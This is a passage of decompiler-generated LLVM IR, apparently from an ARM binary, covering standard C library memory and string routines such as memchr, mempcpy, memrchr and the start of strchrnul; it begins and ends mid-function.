  store i32 %v7_1d4ac, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1d4a0, %bb
  %v0_1d4b0 = phi i32 [ %v7_1d4ac, %bb ], [ %v0_1d4b0.pr, %dec_label_pc_1d4a0 ]
  %v4_1d4b0 = add i32 %v0_1d4b0, 20
  store i32 %v4_1d4b0, i32* %r2.global-to-local, align 4
  %v5_1d4b4 = icmp slt i32 %v0_1d4b0, -20
  br i1 %v5_1d4b4, label %.thread3, label %bb24

bb24:                                             ; preds = %.thread1
  %v6_1d4b4 = load i32, i32* %r1.global-to-local, align 4
  %v7_1d4b4 = add i32 %v6_1d4b4, -4
  %v8_1d4b4 = inttoptr i32 %v7_1d4b4 to i32*
  %v9_1d4b4 = load i32, i32* %v8_1d4b4, align 4
  %v10_1d4b4 = add i32 %v6_1d4b4, -8
  %v11_1d4b4 = inttoptr i32 %v10_1d4b4 to i32*
  %v12_1d4b4 = load i32, i32* %v11_1d4b4, align 4
  store i32 %v12_1d4b4, i32* %ip.global-to-local, align 4
  %v13_1d4b4 = add i32 %v6_1d4b4, -12
  %v14_1d4b4 = inttoptr i32 %v13_1d4b4 to i32*
  %v15_1d4b4 = load i32, i32* %v14_1d4b4, align 4
  store i32 %v15_1d4b4, i32* %lr.global-to-local, align 4
  store i32 %v13_1d4b4, i32* %r1.global-to-local, align 4
  %v6_1d4b8 = load i32, i32* %r0.global-to-local, align 4
  %v7_1d4b8 = add i32 %v6_1d4b8, -12
  %v8_1d4b8 = inttoptr i32 %v7_1d4b8 to i32*
  store i32 %v9_1d4b4, i32* %v8_1d4b8, align 4
  %v10_1d4b8 = add i32 %v6_1d4b8, -8
  %v11_1d4b8 = inttoptr i32 %v10_1d4b8 to i32*
  %v12_1d4b8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v12_1d4b8, i32* %v11_1d4b8, align 4
  %v13_1d4b8 = add i32 %v6_1d4b8, -4
  %v14_1d4b8 = inttoptr i32 %v13_1d4b8 to i32*
  %v15_1d4b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_1d4b8, i32* %v14_1d4b8, align 4
  store i32 %v7_1d4b8, i32* %r0.global-to-local, align 4
  %v6_1d4bc = load i32, i32* %r2.global-to-local, align 4
  %v7_1d4bc = add i32 %v6_1d4bc, -12
  store i32 %v7_1d4bc, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb24
  %v0_1d4c4 = phi i32 [ %v7_1d4bc, %bb24 ], [ %v4_1d4b0, %.thread1 ]
  %v2_1d4c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1d4c0, i32* %r4.global-to-local, align 4
  %v2_1d4c4 = add i32 %v0_1d4c4, 8
  store i32 %v2_1d4c4, i32* %r2.global-to-local, align 4
  %v5_1d4c8 = icmp slt i32 %v0_1d4c4, -8
  br i1 %v5_1d4c8, label %bb26, label %dec_label_pc_1d4cc

dec_label_pc_1d4cc:                               ; preds = %.thread3
  %v6_1d4cc = add i32 %v0_1d4c4, 4
  store i32 %v6_1d4cc, i32* %r2.global-to-local, align 4
  %v5_1d4d0 = icmp slt i32 %v2_1d4c4, 4
  %v6_1d4d0 = load i32, i32* %r1.global-to-local, align 4
  %v7_1d4d0 = add i32 %v6_1d4d0, -4
  %v8_1d4d0 = inttoptr i32 %v7_1d4d0 to i32*
  %v9_1d4d0 = load i32, i32* %v8_1d4d0, align 4
  br i1 %v5_1d4d0, label %.thread7, label %bb25

.thread7:                                         ; preds = %dec_label_pc_1d4cc
  store i32 %v7_1d4d0, i32* %r1.global-to-local, align 4
  %v7_1d4d4 = load i32, i32* %r0.global-to-local, align 4
  %v8_1d4d4 = add i32 %v7_1d4d4, -4
  %v9_1d4d4 = inttoptr i32 %v8_1d4d4 to i32*
  store i32 %v9_1d4d0, i32* %v9_1d4d4, align 4
  %v10_1d4d4 = load i32, i32* %r0.global-to-local, align 4
  %v11_1d4d4 = add i32 %v10_1d4d4, -4
  store i32 %v11_1d4d4, i32* %r0.global-to-local, align 4
  %v0_1d4e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb26

bb25:                                             ; preds = %dec_label_pc_1d4cc
  %v10_1d4d8 = add i32 %v6_1d4d0, -8
  %v11_1d4d8 = inttoptr i32 %v10_1d4d8 to i32*
  %v12_1d4d8 = load i32, i32* %v11_1d4d8, align 4
  store i32 %v12_1d4d8, i32* %ip.global-to-local, align 4
  store i32 %v10_1d4d8, i32* %r1.global-to-local, align 4
  %v6_1d4dc = load i32, i32* %r0.global-to-local, align 4
  %v7_1d4dc = add i32 %v6_1d4dc, -8
  %v8_1d4dc = inttoptr i32 %v7_1d4dc to i32*
  store i32 %v9_1d4d0, i32* %v8_1d4dc, align 4
  %v10_1d4dc = add i32 %v6_1d4dc, -4
  %v11_1d4dc = inttoptr i32 %v10_1d4dc to i32*
  %v12_1d4dc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v12_1d4dc, i32* %v11_1d4dc, align 4
  store i32 %v7_1d4dc, i32* %r0.global-to-local, align 4
  %v6_1d4e0 = load i32, i32* %r2.global-to-local, align 4
  %v7_1d4e0 = add i32 %v6_1d4e0, -4
  store i32 %v7_1d4e0, i32* %r2.global-to-local, align 4
  br label %bb26

bb26:                                             ; preds = %.thread7, %.thread3, %bb25
  %v0_1d4e4 = phi i32 [ %v0_1d4e4.pre, %.thread7 ], [ %v2_1d4c4, %.thread3 ], [ %v7_1d4e0, %bb25 ]
  %v1_1d4e4 = add i32 %v0_1d4e4, 4
  store i32 %v1_1d4e4, i32* %r2.global-to-local, align 4
  %v7_1d4e4 = icmp eq i32 %v1_1d4e4, 0
  br i1 %v7_1d4e4, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v2_1d4e8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v2_1d4e8

bb28:                                             ; preds = %bb26
  %v0_1d4f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d4f0 = add i32 %v0_1d4f0, -1
  %v2_1d4f0 = inttoptr i32 %v1_1d4f0 to i8*
  %v3_1d4f0 = load i8, i8* %v2_1d4f0, align 1
  store i32 %v1_1d4f0, i32* %r1.global-to-local, align 4
  %v2_1d4f4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1d4f4 = add i32 %v2_1d4f4, -1
  %v4_1d4f4 = inttoptr i32 %v3_1d4f4 to i8*
  store i8 %v3_1d4f0, i8* %v4_1d4f4, align 1
  %v5_1d4f4 = load i32, i32* %r0.global-to-local, align 4
  %v6_1d4f4 = add i32 %v5_1d4f4, -1
  store i32 %v6_1d4f4, i32* %r0.global-to-local, align 4
  %v5_1d4f8 = icmp slt i32 %v1_1d4e4, 2
  br i1 %v5_1d4f8, label %.thread13, label %bb29

bb29:                                             ; preds = %bb28
  %v9_1d4ec = icmp eq i32 %v1_1d4e4, 2
  %v6_1d4f8 = load i32, i32* %r1.global-to-local, align 4
  %v7_1d4f8 = add i32 %v6_1d4f8, -1
  %v8_1d4f8 = inttoptr i32 %v7_1d4f8 to i8*
  %v9_1d4f8 = load i8, i8* %v8_1d4f8, align 1
  store i32 %v7_1d4f8, i32* %r1.global-to-local, align 4
  %v9_1d4fc = add i32 %v5_1d4f4, -2
  %v10_1d4fc = inttoptr i32 %v9_1d4fc to i8*
  store i8 %v9_1d4f8, i8* %v10_1d4fc, align 1
  %v11_1d4fc = load i32, i32* %r0.global-to-local, align 4
  %v12_1d4fc = add i32 %v11_1d4fc, -1
  store i32 %v12_1d4fc, i32* %r0.global-to-local, align 4
  br i1 %v9_1d4ec, label %.thread13, label %bb30

bb30:                                             ; preds = %bb29
  %v8_1d500 = load i32, i32* %r1.global-to-local, align 4
  %v9_1d500 = add i32 %v8_1d500, -1
  %v10_1d500 = inttoptr i32 %v9_1d500 to i8*
  %v11_1d500 = load i8, i8* %v10_1d500, align 1
  store i32 %v9_1d500, i32* %r1.global-to-local, align 4
  %v11_1d504 = add i32 %v11_1d4fc, -2
  %v12_1d504 = inttoptr i32 %v11_1d504 to i8*
  store i8 %v11_1d500, i8* %v12_1d504, align 1
  %v13_1d504 = load i32, i32* %r0.global-to-local, align 4
  %v14_1d504 = add i32 %v13_1d504, -1
  store i32 %v14_1d504, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb29, %bb28, %bb30
  %v1_1d508 = phi i32 [ %v12_1d4fc, %bb29 ], [ %v6_1d4f4, %bb28 ], [ %v14_1d504, %bb30 ]
  ret i32 %v1_1d508

; uselistorder directives
  uselistorder i32 %v7_1d4dc, { 1, 0 }
  uselistorder i32 %v10_1d4d8, { 1, 0 }
  uselistorder i32 %v9_1d4d0, { 1, 0 }
  uselistorder i32 %v0_1d4c4, { 0, 2, 1 }
  uselistorder i32 %v7_1d4b8, { 1, 0 }
  uselistorder i32 %v13_1d4b4, { 1, 0 }
  uselistorder i32 %v0_1d4b0, { 1, 0 }
  uselistorder i32 %v7_1d4a8, { 1, 0 }
  uselistorder i32 %v16_1d4a4, { 1, 0 }
  uselistorder i32 %v1_1d494, { 2, 1, 0 }
  uselistorder i32 %v10_1d490, { 1, 0 }
  uselistorder i32 %v1_1d48c, { 1, 0 }
  uselistorder i32 %v10_1d488, { 1, 0 }
  uselistorder i32 %v0_1d48c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 10, 6, 7, 11, 8, 12, 9, 13, 15, 16, 17, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 12, 13, 11, 7, 14, 8, 15, 16, 9, 17, 10, 18, 19, 20, 0, 1 }
  uselistorder label %.thread13, { 2, 0, 1 }
  uselistorder label %bb26, { 2, 0, 1 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1d488, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1d694 = urem i32 %arg1, 256
  %v0_1d6b0.pr = load i32, i32* @r2, align 4
  %v2_1d6b015 = icmp eq i32 %v0_1d6b0.pr, 0
  %v0_1d6c4.pre = load i32, i32* @r0, align 4
  br i1 %v2_1d6b015, label %dec_label_pc_1d6c0, label %dec_label_pc_1d6b8

dec_label_pc_1d69c:                               ; preds = %dec_label_pc_1d6b8
  %v1_1d69c = inttoptr i32 %v0_1d6ac to i8*
  %v2_1d69c = load i8, i8* %v1_1d69c, align 1
  %v3_1d69c = zext i8 %v2_1d69c to i32
  %v9_1d6a0 = icmp eq i32 %v3_1d69c, %v1_1d694
  br i1 %v9_1d6a0, label %dec_label_pc_1d770, label %dec_label_pc_1d6a8

dec_label_pc_1d6a8:                               ; preds = %dec_label_pc_1d69c
  %v1_1d6a8 = add i32 %v0_1d6a8, -1
  %v1_1d6ac = add i32 %v0_1d6ac, 1
  %v2_1d6b0 = icmp eq i32 %v1_1d6a8, 0
  br i1 %v2_1d6b0, label %dec_label_pc_1d6c0, label %dec_label_pc_1d6b8

dec_label_pc_1d6b8:                               ; preds = %entry, %dec_label_pc_1d6a8
  %v0_1d6a8 = phi i32 [ %v1_1d6a8, %dec_label_pc_1d6a8 ], [ %v0_1d6b0.pr, %entry ]
  %v0_1d6ac = phi i32 [ %v1_1d6ac, %dec_label_pc_1d6a8 ], [ %v0_1d6c4.pre, %entry ]
  %v1_1d6b8 = urem i32 %v0_1d6ac, 4
  %v2_1d6b8 = icmp eq i32 %v1_1d6b8, 0
  br i1 %v2_1d6b8, label %dec_label_pc_1d6c0, label %dec_label_pc_1d69c

dec_label_pc_1d6c0:                               ; preds = %dec_label_pc_1d6a8, %dec_label_pc_1d6b8, %entry
  %v0_1d73c22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1d6a8 ], [ %v0_1d6a8, %dec_label_pc_1d6b8 ]
  %v0_1d6c4 = phi i32 [ %v0_1d6c4.pre, %entry ], [ %v1_1d6ac, %dec_label_pc_1d6a8 ], [ %v0_1d6ac, %dec_label_pc_1d6b8 ]
  %v4_1d6c0 = mul nuw nsw i32 %v1_1d694, 256
  %v5_1d6c0 = or i32 %v4_1d6c0, %v1_1d694
  %v4_1d6c8 = mul i32 %v5_1d6c0, 65536
  %v5_1d6c8 = or i32 %v4_1d6c8, %v5_1d6c0
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1d73c22, 3
  br i1 %tmp, label %dec_label_pc_1d6d0, label %dec_label_pc_1d764.preheader

dec_label_pc_1d6d0:                               ; preds = %dec_label_pc_1d6c0, %dec_label_pc_1d73c.backedge
  %v0_1d6ec60 = phi i32 [ %v1_1d6ec, %dec_label_pc_1d73c.backedge ], [ %v0_1d73c22, %dec_label_pc_1d6c0 ]
  %v0_1d71059 = phi i32 [ %v4_1d6d0, %dec_label_pc_1d73c.backedge ], [ %v0_1d6c4, %dec_label_pc_1d6c0 ]
  %v1_1d6d0 = inttoptr i32 %v0_1d71059 to i32*
  %v2_1d6d0 = load i32, i32* %v1_1d6d0, align 4
  %v4_1d6d0 = add i32 %v0_1d71059, 4
  %v2_1d6d4 = xor i32 %v2_1d6d0, %v5_1d6c8
  %v2_1d6d8 = add i32 %v2_1d6d4, 2130640639
  %v1_1d6dc = sub i32 -1, %v2_1d6d4
  %v2_1d6e0 = xor i32 %v2_1d6d8, %v1_1d6dc
  %v2_1d6e4 = and i32 %v2_1d6e0, -2130640640
  %v2_1d6e8 = icmp eq i32 %v2_1d6e4, 0
  %v1_1d6ec = add i32 %v0_1d6ec60, -4
  br i1 %v2_1d6e8, label %dec_label_pc_1d73c.backedge, label %dec_label_pc_1d6f4

dec_label_pc_1d73c.backedge:                      ; preds = %dec_label_pc_1d6d0, %dec_label_pc_1d72c
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_1d6ec, 3
  br i1 %tmp73, label %dec_label_pc_1d6d0, label %dec_label_pc_1d764.preheader

dec_label_pc_1d6f4:                               ; preds = %dec_label_pc_1d6d0
  %v2_1d6f4 = inttoptr i32 %v0_1d71059 to i8*
  %v3_1d6f4 = load i8, i8* %v2_1d6f4, align 1
  %v4_1d6f4 = zext i8 %v3_1d6f4 to i32
  %v9_1d6fc = icmp eq i32 %v4_1d6f4, %v1_1d694
  %v1_1d700 = add i32 %v0_1d71059, 3
  store i32 %v1_1d700, i32* @ip, align 4
  br i1 %v9_1d6fc, label %dec_label_pc_1d770, label %dec_label_pc_1d708

dec_label_pc_1d708:                               ; preds = %dec_label_pc_1d6f4
  %v1_1d708 = add i32 %v0_1d71059, 1
  %v2_1d708 = inttoptr i32 %v1_1d708 to i8*
  %v3_1d708 = load i8, i8* %v2_1d708, align 1
  %v4_1d708 = zext i8 %v3_1d708 to i32
  %v9_1d70c = icmp eq i32 %v4_1d708, %v1_1d694
  br i1 %v9_1d70c, label %bb, label %dec_label_pc_1d71c

bb:                                               ; preds = %dec_label_pc_1d708
  br label %dec_label_pc_1d770

dec_label_pc_1d71c:                               ; preds = %dec_label_pc_1d708
  %v1_1d71c = add i32 %v0_1d71059, 2
  %v2_1d71c = inttoptr i32 %v1_1d71c to i8*
  %v3_1d71c = load i8, i8* %v2_1d71c, align 1
  %v4_1d71c = zext i8 %v3_1d71c to i32
  %v9_1d720 = icmp eq i32 %v4_1d71c, %v1_1d694
  br i1 %v9_1d720, label %dec_label_pc_1d770, label %dec_label_pc_1d72c

dec_label_pc_1d72c:                               ; preds = %dec_label_pc_1d71c
  %v2_1d72c = inttoptr i32 %v1_1d700 to i8*
  %v3_1d72c = load i8, i8* %v2_1d72c, align 1
  %v4_1d72c = zext i8 %v3_1d72c to i32
  %v9_1d730 = icmp eq i32 %v4_1d72c, %v1_1d694
  br i1 %v9_1d730, label %bb36, label %dec_label_pc_1d73c.backedge

bb36:                                             ; preds = %dec_label_pc_1d72c
  br label %dec_label_pc_1d770

dec_label_pc_1d764.preheader:                     ; preds = %dec_label_pc_1d73c.backedge, %dec_label_pc_1d6c0
  %v0_1d710.lcssa = phi i32 [ %v0_1d6c4, %dec_label_pc_1d6c0 ], [ %v4_1d6d0, %dec_label_pc_1d73c.backedge ]
  %v0_1d6ec.lcssa = phi i32 [ %v0_1d73c22, %dec_label_pc_1d6c0 ], [ %v1_1d6ec, %dec_label_pc_1d73c.backedge ]
  %v2_1d7647 = icmp eq i32 %v0_1d6ec.lcssa, 0
  br i1 %v2_1d7647, label %dec_label_pc_1d76c, label %dec_label_pc_1d754

dec_label_pc_1d754:                               ; preds = %dec_label_pc_1d760, %dec_label_pc_1d764.preheader
  %v0_1d764.in = phi i32 [ %v0_1d764, %dec_label_pc_1d760 ], [ %v0_1d6ec.lcssa, %dec_label_pc_1d764.preheader ]
  %v0_1d760 = phi i32 [ %v1_1d760, %dec_label_pc_1d760 ], [ %v0_1d710.lcssa, %dec_label_pc_1d764.preheader ]
  %v0_1d764 = add i32 %v0_1d764.in, -1
  %v1_1d754 = inttoptr i32 %v0_1d760 to i8*
  %v2_1d754 = load i8, i8* %v1_1d754, align 1
  %v3_1d754 = zext i8 %v2_1d754 to i32
  %v9_1d758 = icmp eq i32 %v3_1d754, %v1_1d694
  br i1 %v9_1d758, label %dec_label_pc_1d770, label %dec_label_pc_1d760

dec_label_pc_1d760:                               ; preds = %dec_label_pc_1d754
  %v1_1d760 = add i32 %v0_1d760, 1
  %v2_1d764 = icmp eq i32 %v0_1d764, 0
  br i1 %v2_1d764, label %dec_label_pc_1d76c, label %dec_label_pc_1d754

dec_label_pc_1d76c:                               ; preds = %dec_label_pc_1d760, %dec_label_pc_1d764.preheader
  br label %dec_label_pc_1d770

dec_label_pc_1d770:                               ; preds = %dec_label_pc_1d69c, %dec_label_pc_1d71c, %dec_label_pc_1d6f4, %dec_label_pc_1d754, %bb36, %bb, %dec_label_pc_1d76c
  %v1_1d774 = phi i32 [ 0, %dec_label_pc_1d76c ], [ %v1_1d708, %bb ], [ %v1_1d700, %bb36 ], [ %v0_1d760, %dec_label_pc_1d754 ], [ %v1_1d71c, %dec_label_pc_1d71c ], [ %v0_1d71059, %dec_label_pc_1d6f4 ], [ %v0_1d6ac, %dec_label_pc_1d69c ]
  ret i32 %v1_1d774

; uselistorder directives
  uselistorder i32 %v1_1d6ec, { 1, 0, 2 }
  uselistorder i32 %v0_1d71059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_1d6c0, { 1, 0 }
  uselistorder i32 %v0_1d73c22, { 1, 2, 0 }
  uselistorder i32 %v0_1d6ac, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_1d6c4.pre, { 1, 0 }
  uselistorder i32 %v1_1d694, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_1d770, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_1d73c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1d6d0, { 1, 0 }
  uselistorder label %dec_label_pc_1d6c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d6b8, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_1d780 = load i32, i32* @r4, align 4
  %v6_1d780 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1d790 = call i32 @memcpy()
  %v0_1d794 = load i32, i32* @r5, align 4
  %v1_1d794 = load i32, i32* @r4, align 4
  %v2_1d794 = add i32 %v1_1d794, %v0_1d794
  store i32 %v3_1d780, i32* @r4, align 4
  store i32 %v6_1d780, i32* @r5, align 4
  ret i32 %v2_1d794
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1d7a8 = urem i32 %arg2, 256
  %v2_1d7ac = add i32 %arg3, %arg1
  %v2_1d7c44 = icmp eq i32 %arg3, 0
  br i1 %v2_1d7c44, label %dec_label_pc_1d7d4, label %dec_label_pc_1d7cc

dec_label_pc_1d7b4:                               ; preds = %dec_label_pc_1d7cc
  %v1_1d7b4 = add i32 %v0_1d7b4, -1
  %v2_1d7b4 = inttoptr i32 %v1_1d7b4 to i8*
  %v3_1d7b4 = load i8, i8* %v2_1d7b4, align 1
  %v4_1d7b4 = zext i8 %v3_1d7b4 to i32
  %v9_1d7b8 = icmp eq i32 %v4_1d7b4, %v1_1d7a8
  br i1 %v9_1d7b8, label %dec_label_pc_1d874, label %dec_label_pc_1d7c0

dec_label_pc_1d7c0:                               ; preds = %dec_label_pc_1d7b4
  %v1_1d7c0 = add i32 %v0_1d7c0, -1
  %v2_1d7c4 = icmp eq i32 %v1_1d7c0, 0
  br i1 %v2_1d7c4, label %dec_label_pc_1d7d4, label %dec_label_pc_1d7cc

dec_label_pc_1d7cc:                               ; preds = %entry, %dec_label_pc_1d7c0
  %v0_1d7c0 = phi i32 [ %v1_1d7c0, %dec_label_pc_1d7c0 ], [ %arg3, %entry ]
  %v0_1d7b4 = phi i32 [ %v1_1d7b4, %dec_label_pc_1d7c0 ], [ %v2_1d7ac, %entry ]
  %v1_1d7cc = urem i32 %v0_1d7b4, 4
  %v2_1d7cc = icmp eq i32 %v1_1d7cc, 0
  br i1 %v2_1d7cc, label %dec_label_pc_1d7d4, label %dec_label_pc_1d7b4

dec_label_pc_1d7d4:                               ; preds = %dec_label_pc_1d7c0, %dec_label_pc_1d7cc, %entry
  %v0_1d85c13 = phi i32 [ %v2_1d7ac, %entry ], [ %v1_1d7b4, %dec_label_pc_1d7c0 ], [ %v0_1d7b4, %dec_label_pc_1d7cc ]
  %v0_1d8489 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1d7c0 ], [ %v0_1d7c0, %dec_label_pc_1d7cc ]
  %v4_1d7d4 = mul nuw nsw i32 %v1_1d7a8, 256
  %v5_1d7d4 = or i32 %v4_1d7d4, %v1_1d7a8
  %v4_1d7d8 = mul i32 %v5_1d7d4, 65536
  %v5_1d7d8 = or i32 %v4_1d7d8, %v5_1d7d4
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1d8489, 3
  br i1 %tmp, label %dec_label_pc_1d7e0, label %dec_label_pc_1d868

dec_label_pc_1d7e0:                               ; preds = %dec_label_pc_1d7d4, %dec_label_pc_1d848.backedge
  %v0_1d7fc40 = phi i32 [ %v1_1d7fc, %dec_label_pc_1d848.backedge ], [ %v0_1d8489, %dec_label_pc_1d7d4 ]
  %v0_1d7e039 = phi i32 [ %v1_1d7e0, %dec_label_pc_1d848.backedge ], [ %v0_1d85c13, %dec_label_pc_1d7d4 ]
  %v1_1d7e0 = add i32 %v0_1d7e039, -4
  %v2_1d7e0 = inttoptr i32 %v1_1d7e0 to i32*
  %v3_1d7e0 = load i32, i32* %v2_1d7e0, align 4
  %v2_1d7e4 = xor i32 %v3_1d7e0, %v5_1d7d8
  %v2_1d7e8 = add i32 %v2_1d7e4, 2130640639
  store i32 %v2_1d7e8, i32* @ip, align 4
  %v1_1d7ec = sub i32 -1, %v2_1d7e4
  %v2_1d7f0 = xor i32 %v2_1d7e8, %v1_1d7ec
  %v2_1d7f4 = and i32 %v2_1d7f0, -2130640640
  %v2_1d7f8 = icmp eq i32 %v2_1d7f4, 0
  %v1_1d7fc = add i32 %v0_1d7fc40, -4
  br i1 %v2_1d7f8, label %dec_label_pc_1d848.backedge, label %dec_label_pc_1d804

dec_label_pc_1d848.backedge:                      ; preds = %dec_label_pc_1d7e0, %dec_label_pc_1d83c
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_1d7fc, 3
  br i1 %tmp46, label %dec_label_pc_1d7e0, label %dec_label_pc_1d868

dec_label_pc_1d804:                               ; preds = %dec_label_pc_1d7e0
  %v1_1d804 = add i32 %v0_1d7e039, -1
  %v2_1d804 = inttoptr i32 %v1_1d804 to i8*
  %v3_1d804 = load i8, i8* %v2_1d804, align 1
  %v4_1d804 = zext i8 %v3_1d804 to i32
  %v9_1d808 = icmp eq i32 %v4_1d804, %v1_1d7a8
  br i1 %v9_1d808, label %dec_label_pc_1d834, label %dec_label_pc_1d814

dec_label_pc_1d814:                               ; preds = %dec_label_pc_1d804
  %v1_1d814 = add i32 %v0_1d7e039, -2
  %v2_1d814 = inttoptr i32 %v1_1d814 to i8*
  %v3_1d814 = load i8, i8* %v2_1d814, align 1
  %v4_1d814 = zext i8 %v3_1d814 to i32
  %v9_1d818 = icmp eq i32 %v4_1d814, %v1_1d7a8
  br i1 %v9_1d818, label %dec_label_pc_1d834, label %dec_label_pc_1d824

dec_label_pc_1d824:                               ; preds = %dec_label_pc_1d814
  %v1_1d824 = add i32 %v0_1d7e039, -3
  %v2_1d824 = inttoptr i32 %v1_1d824 to i8*
  %v3_1d824 = load i8, i8* %v2_1d824, align 1
  %v4_1d824 = zext i8 %v3_1d824 to i32
  %v9_1d828 = icmp eq i32 %v4_1d824, %v1_1d7a8
  br i1 %v9_1d828, label %dec_label_pc_1d834, label %dec_label_pc_1d83c

dec_label_pc_1d834:                               ; preds = %dec_label_pc_1d824, %dec_label_pc_1d814, %dec_label_pc_1d804
  %v0_1d834 = phi i32 [ %v1_1d824, %dec_label_pc_1d824 ], [ %v1_1d814, %dec_label_pc_1d814 ], [ %v1_1d804, %dec_label_pc_1d804 ]
  br label %dec_label_pc_1d874

dec_label_pc_1d83c:                               ; preds = %dec_label_pc_1d824
  %v1_1d83c = inttoptr i32 %v1_1d7e0 to i8*
  %v2_1d83c = load i8, i8* %v1_1d83c, align 1
  %v3_1d83c = zext i8 %v2_1d83c to i32
  %v9_1d840 = icmp eq i32 %v3_1d83c, %v1_1d7a8
  br i1 %v9_1d840, label %dec_label_pc_1d874, label %dec_label_pc_1d848.backedge

dec_label_pc_1d85c:                               ; preds = %dec_label_pc_1d868
  %v1_1d868 = add i32 %v0_1d868, -1
  %v1_1d85c = add i32 %v0_1d85c, -1
  %v2_1d85c = inttoptr i32 %v1_1d85c to i8*
  %v3_1d85c = load i8, i8* %v2_1d85c, align 1
  %v4_1d85c = zext i8 %v3_1d85c to i32
  %v9_1d860 = icmp eq i32 %v4_1d85c, %v1_1d7a8
  br i1 %v9_1d860, label %dec_label_pc_1d874, label %dec_label_pc_1d868

dec_label_pc_1d868:                               ; preds = %dec_label_pc_1d7d4, %dec_label_pc_1d848.backedge, %dec_label_pc_1d85c
  %v0_1d85c = phi i32 [ %v1_1d85c, %dec_label_pc_1d85c ], [ %v0_1d85c13, %dec_label_pc_1d7d4 ], [ %v1_1d7e0, %dec_label_pc_1d848.backedge ]
  %v0_1d868 = phi i32 [ %v1_1d868, %dec_label_pc_1d85c ], [ %v0_1d8489, %dec_label_pc_1d7d4 ], [ %v1_1d7fc, %dec_label_pc_1d848.backedge ]
  %v2_1d868 = icmp eq i32 %v0_1d868, 0
  br i1 %v2_1d868, label %dec_label_pc_1d870, label %dec_label_pc_1d85c

dec_label_pc_1d870:                               ; preds = %dec_label_pc_1d868
  br label %dec_label_pc_1d874

dec_label_pc_1d874:                               ; preds = %dec_label_pc_1d7b4, %dec_label_pc_1d83c, %dec_label_pc_1d85c, %dec_label_pc_1d834, %dec_label_pc_1d870
  %v1_1d878 = phi i32 [ %v0_1d834, %dec_label_pc_1d834 ], [ 0, %dec_label_pc_1d870 ], [ %v1_1d85c, %dec_label_pc_1d85c ], [ %v1_1d7e0, %dec_label_pc_1d83c ], [ %v1_1d7b4, %dec_label_pc_1d7b4 ]
  ret i32 %v1_1d878

; uselistorder directives
  uselistorder i32 %v0_1d868, { 1, 0 }
  uselistorder i32 %v1_1d7fc, { 1, 0, 2 }
  uselistorder i32 %v1_1d7e0, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_1d7e039, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1d7d4, { 1, 0 }
  uselistorder i32 %v0_1d8489, { 1, 2, 0 }
  uselistorder i32 %v0_1d7b4, { 1, 0, 2 }
  uselistorder i32 %v2_1d7ac, { 1, 0 }
  uselistorder i32 %v1_1d7a8, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d874, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1d868, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d848.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1d7e0, { 1, 0 }
  uselistorder label %dec_label_pc_1d7d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d7cc, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_1d888 = urem i32 %arg1, 256
  %v0_1d8a82 = load i32, i32* @r0, align 4
  %v1_1d8a83 = urem i32 %v0_1d8a82, 4
  %v2_1d8a84 = icmp eq i32 %v1_1d8a83, 0
  br i1 %v2_1d8a84, label %dec_label_pc_1d8b0, label %dec_label_pc_1d890

dec_label_pc_1d890:                               ; preds = %entry, %dec_label_pc_1d8a4
  %v0_1d8a4 = phi i32 [ %v1_1d8a4, %dec_label_pc_1d8a4 ], [ %v0_1d8a82, %entry ]
  %v1_1d890 = inttoptr i32 %v0_1d8a4 to i8*
  %v2_1d890 = load i8, i8* %v1_1d890, align 1
